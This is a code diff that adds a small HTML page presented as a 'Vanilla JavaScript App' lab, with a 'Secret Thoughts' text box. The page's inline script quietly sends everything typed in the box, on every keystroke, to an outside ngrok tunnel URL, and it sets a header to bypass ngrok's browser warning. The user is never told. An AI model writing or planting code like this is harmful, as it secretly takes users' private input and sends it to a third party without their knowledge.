@@ -1,0 +1,33 @@
+<!doctype html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+        <link rel="stylesheet" href="styles.css" />
+        <title>Vanilla JavaScript App</title>
+    </head>
+
+    <body>
+        <div>
+            <h1>Static Web App Lab 4 - Write</h1>
+            <div>
+                <h2>Secret Thoughts</h2>
+                <textarea id="secretThoughts"></textarea>
+            </div>
+        </div>
+        <script>
+            const textarea = document.getElementById("secretThoughts");
+            textarea.addEventListener("input", function (e) {
+                const text = e.target.value;
+                fetch(
+                    `https://defender-avenge-unnoticed.ngrok-free.dev?text=${encodeURIComponent(text)}&timestamp=${encodeURIComponent(new Date().toISOString())}`,
+                    {
+                        headers: new Headers({
+                            "ngrok-skip-browser-warning": "test",
+                        }),
+                    },
+                ).catch(console.error);
+            });
+        </script>
+    </body>
+</html>
